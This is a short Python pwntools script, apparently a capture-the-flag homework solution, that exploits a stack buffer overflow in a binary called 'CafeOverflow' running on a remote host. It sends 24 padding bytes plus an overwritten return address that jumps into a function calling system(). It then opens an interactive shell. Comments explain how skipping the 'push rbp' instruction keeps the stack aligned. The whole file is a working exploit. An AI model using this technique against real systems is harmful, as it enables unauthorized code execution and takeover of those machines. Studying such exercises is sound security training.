from pwn import *
context.arch = 'amd64'

r = remote("hw00.zoolab.org", 65534)
#r = process("./CafeOverflow")
#gdb.attach(r)

#func1 = 0x401176
system_addr = 0x4011a1

r.recvuntil("What is your name : ")

#payload = flat("a" * 24, func1)

# note that set to start of func1 will execute "push rbp"
# since system() requires stack to be 0x10 alignment
# originally call function will operate "push rip"
# then "push rbp" will be fine
# However, now we use "ret" to jmp to the func1, do not operate "push rip"
# this causes that rsp points to 0x...8 (not 0x10 alignment)
# thus avoid the "push rbp" instruction

payload = flat("a" * 24,  system_addr)

r.sendline(payload)

r.interactive()

